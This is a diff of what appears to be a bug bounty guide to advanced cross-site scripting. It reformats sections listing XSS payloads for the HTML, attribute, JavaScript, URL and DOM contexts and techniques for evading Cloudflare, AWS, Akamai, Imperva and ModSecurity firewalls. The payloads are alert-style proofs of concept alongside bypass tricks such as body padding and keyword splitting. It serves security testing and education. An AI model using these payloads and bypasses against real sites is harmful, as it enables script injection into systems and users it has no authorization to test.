@@ -181,21 +181,98 @@ Reflect.construct(Function, ['alert(1)'])();
 
 Advanced XSS heavily depends on the execution context. The same payload will not work everywhere; attackers must adapt their injection depending on where the user input is reflected. In 2025 and 2026, context-aware encoding and mismatched contexts have become critical components of advanced evasion strategies.
 
-- **HTML Context**: Input is reflected between standard HTML tags (e.g., `<div>INPUT</div>`). 
-  - *Classic Payload*: `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`
-  - *2025/2026 Evasion*: Utilizing mutation XSS (mXSS) where browsers re-interpret seemingly harmless input natively, such as `<svg><script>alert(1)</script></svg>`.
-- **Attribute Context**: Input is reflected inside an HTML attribute (e.g., `<input value="INPUT">`). 
-  - *Classic Payload*: `"><script>alert(1)</script>` or `" autofocus onfocus="alert(1)`
-  - *2025/2026 Evasion*: Injecting into newer HTML5 attributes or exploiting framework contexts where attribute values are dynamically evaluated as code (e.g., Vue or Angular directives).
-- **JavaScript Context**: Input is reflected inside an existing `<script>` block (e.g., `var user = 'INPUT';`).
-  - *Classic Payload*: `'; alert(1); //` or `'-alert(1)-'`
-  - *2025/2026 Evasion*: Using template literal injection (`` `${alert(1)}` ``) or exploiting JSON stringification parsing bugs where payloads are sanitized for JSON but later rendered unsafely in HTML views.
-- **URL Context**: Input is reflected inside an `href` or `src` attribute (e.g., `<a href="INPUT">`).
-  - *Classic Payload*: `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>`
-  - *2025/2026 Evasion*: Cloaking payloads in deep URL encoding or leveraging `blob:` and `data:` URIs combined with dynamic `import()` calls to bypass static WAF constraints.
-- **Mismatched Contexts (2025/2026 Trend)**: Data is sanitized correctly for one context (e.g., a database) but retrieved and rendered in another (e.g., a log dashboard) without re-encoding. An XSS payload in JSON might be safely escaped with Unicode (`\u003c`), but executed when a separate microservice decodes and logs it into an HTML viewer.
-- **DOM Context**: Input is processed by client-side JavaScript and passed to a dangerous sink (e.g., `innerHTML`, `eval`, or `setTimeout`).
-  - *Payload*: Depends on the sink, but often requires breaking out of strings and objects. In recent AI-integrated apps (e.g., CVE-2025-0142), DOM contexts are often poisoned by manipulating prompts fed into client-side LLMs.
+#### HTML Context
+
+Input is reflected between standard HTML tags (e.g., `<div>INPUT</div>`). 
+
+**Classic Payload:**
+
+```html
+<script>alert(1)</script>
+```
+or
+```html
+<img src=x onerror=alert(1)>
+```
+
+**2025/2026 Evasion:**
+
+Utilizing mutation XSS (mXSS) where browsers re-interpret seemingly harmless input natively, such as:
+
+```html
+<svg><script>alert(1)</script></svg>
+```
+
+#### Attribute Context
+
+Input is reflected inside an HTML attribute (e.g., `<input value="INPUT">`). 
+
+**Classic Payload:**
+
+```html
+"><script>alert(1)</script>
+```
+or
+```html
+" autofocus onfocus="alert(1)
+```
+
+**2025/2026 Evasion:**
+
+Injecting into newer HTML5 attributes or exploiting framework contexts where attribute values are dynamically evaluated as code (e.g., Vue or Angular directives).
+
+#### JavaScript Context
+
+Input is reflected inside an existing `<script>` block (e.g., `var user = 'INPUT';`).
+
+**Classic Payload:**
+
+```javascript
+'; alert(1); //
+```
+or
+```javascript
+'-alert(1)-'
+```
+
+**2025/2026 Evasion:**
+
+Using template literal injection:
+
+```javascript
+`${alert(1)}`
+```
+or exploiting JSON stringification parsing bugs where payloads are sanitized for JSON but later rendered unsafely in HTML views.
+
+#### URL Context
+
+Input is reflected inside an `href` or `src` attribute (e.g., `<a href="INPUT">`).
+
+**Classic Payload:**
+
+```html
+javascript:alert(1)
+```
+or
+```html
+data:text/html,<script>alert(1)</script>
+```
+
+**2025/2026 Evasion:**
+
+Cloaking payloads in deep URL encoding or leveraging `blob:` and `data:` URIs combined with dynamic `import()` calls to bypass static WAF constraints.
+
+#### Mismatched Contexts (2025/2026 Trend)
+
+Data is sanitized correctly for one context (e.g., a database) but retrieved and rendered in another (e.g., a log dashboard) without re-encoding. An XSS payload in JSON might be safely escaped with Unicode (`\u003c`), but executed when a separate microservice decodes and logs it into an HTML viewer.
+
+#### DOM Context
+
+Input is processed by client-side JavaScript and passed to a dangerous sink (e.g., `innerHTML`, `eval`, or `setTimeout`).
+
+**Payload:**
+
+Depends on the sink, but often requires breaking out of strings and objects. In recent AI-integrated apps (e.g., CVE-2025-0142), DOM contexts are often poisoned by manipulating prompts fed into client-side LLMs.
 
 ---
 
@@ -334,19 +411,69 @@ String.raw`<script>alert(1)</script>`;
 
 Bug bounty hunters frequently encounter Web Application Firewalls (WAFs) that block obvious payloads. Evasion in 2025 and 2026 heavily relies on abusing parser logic discrepancies, payload fragmentation, emerging HTML attributes, and exploiting architectural inspection limits. 
 
-- **Cloudflare Bypass**: While Cloudflare maintains robust protections, recent bypasses exploit HTML parser anomalies and event handler abuse.
-  - *Techniques*: "Attribute Overloading" via non-standard attributes or using payloads like `<Img/Src/OnError=(alert)(1)>` (mixed casing and null-byte injection) remain effective. Other vectors include `onToggle` event abuse using the `<details>` element (e.g., `<details/open/ontoggle=confirm(1)>`), and evading regex via alternate space characters (e.g., `/` instead of `%20`).
-  - *Sources*: [Cloudflare Security Research](https://blog.cloudflare.com/), [WAF-Bypass 2025 Payloads](https://waf-bypass.com/).
-- **AWS WAF Bypass**: Recent 2025/2026 research highlights severe bypasses targeting AWS Managed Rules by exploiting inspection constraints and parsing logic.
-  - *Techniques*: The `CrossSiteScripting_BODY` rule historically inspects only the first 8KB of the request body. Attackers pad requests with junk data to push the XSS payload outside this inspection window. Furthermore, HTTP Parameter Pollution (HPP) combined with JavaScript injection has achieved over 70% bypass rates against AWS WAFs by exploiting differences in how the WAF and backend (e.g., ASP.NET) concatenate parameters.
-  - *Sources*: [CyberSecurityNews: HTTP Parameter Pollution WAF Bypass](https://cybersecuritynews.com/), [AWS WAF Inspection Thresholds](https://docs.aws.amazon.com/).
-- **Akamai & Imperva Bypass**: These firewalls detect common JS functions natively (`alert`, `prompt`) and static malware signatures.
-  - *Techniques*: Attackers bypass them using dynamic polymorphic payloads, keyword splitting via array access (`top["al"+"ert"](1)`), and nesting payloads within deeply structured JSON or XML where WAF regex engines frequently time out or fail to inspect thoroughly.
-- **ModSecurity (OWASP CRS) Bypass**: Relies heavily on regular expression matching which can be overwhelmed or bypassed via syntax manipulation.
-  - *Techniques*: Advanced character splicing (`<scr\ipt>`), Unicode normalization attacks (`\u0061\u006c\u0065\u0072\u0074(1)`), and injecting payloads into overlooked HTTP methods (`PUT`, `OPTIONS`) or headers (`User-Agent`, `Referer`).
-- **Protocol-Level & Advanced Evasion**: Moving beyond standard HTTP requests to evade WAFs entirely.
-  - *Techniques*: Exploiting HTTP/2 specific frames, gRPC anomalies, and inserting payloads during WebSocket handshakes (CSWSH), exploiting the fact that many modern WAFs struggle to parse non-classic, multiplexed traffic at scale.
-  - *Sources*: [PortSwigger Web Security Research](https://portswigger.net/research/).
+#### Cloudflare Bypass
+
+While Cloudflare maintains robust protections, recent bypasses exploit HTML parser anomalies and event handler abuse.
+
+**Techniques:**
+
+"Attribute Overloading" via non-standard attributes or using payloads like:
+
+```html
+<Img/Src/OnError=(alert)(1)>
+```
+
+(mixed casing and null-byte injection) remain effective. Other vectors include `onToggle` event abuse using the `<details>` element:
+
+```html
+<details/open/ontoggle=confirm(1)>
+```
+
+and evading regex via alternate space characters (e.g., `/` instead of `%20`).
+
+**Sources:** [Cloudflare Security Research](https://blog.cloudflare.com/), [WAF-Bypass 2025 Payloads](https://waf-bypass.com/).
+
+#### AWS WAF Bypass
+
+Recent 2025/2026 research highlights severe bypasses targeting AWS Managed Rules by exploiting inspection constraints and parsing logic.
+
+**Techniques:**
+
+The `CrossSiteScripting_BODY` rule historically inspects only the first 8KB of the request body. Attackers pad requests with junk data to push the XSS payload outside this inspection window. Furthermore, HTTP Parameter Pollution (HPP) combined with JavaScript injection has achieved over 70% bypass rates against AWS WAFs by exploiting differences in how the WAF and backend (e.g., ASP.NET) concatenate parameters.
+
+**Sources:** [CyberSecurityNews: HTTP Parameter Pollution WAF Bypass](https://cybersecuritynews.com/), [AWS WAF Inspection Thresholds](https://docs.aws.amazon.com/).
+
+#### Akamai & Imperva Bypass
+
+These firewalls detect common JS functions natively (`alert`, `prompt`) and static malware signatures.
+
+**Techniques:**
+
+Attackers bypass them using dynamic polymorphic payloads, keyword splitting via array access:
+
+```javascript
+top["al"+"ert"](1)
+```
+
+and nesting payloads within deeply structured JSON or XML where WAF regex engines frequently time out or fail to inspect thoroughly.
+
+#### ModSecurity (OWASP CRS) Bypass
+
+Relies heavily on regular expression matching which can be overwhelmed or bypassed via syntax manipulation.
+
+**Techniques:**
+
+Advanced character splicing (`<scr\ipt>`), Unicode normalization attacks (`\u0061\u006c\u0065\u0072\u0074(1)`), and injecting payloads into overlooked HTTP methods (`PUT`, `OPTIONS`) or headers (`User-Agent`, `Referer`).
+
+#### Protocol-Level & Advanced Evasion
+
+Moving beyond standard HTTP requests to evade WAFs entirely.
+
+**Techniques:**
+
+Exploiting HTTP/2 specific frames, gRPC anomalies, and inserting payloads during WebSocket handshakes (CSWSH), exploiting the fact that many modern WAFs struggle to parse non-classic, multiplexed traffic at scale.
+
+**Sources:** [PortSwigger Web Security Research](https://portswigger.net/research/).
 
 ---
 
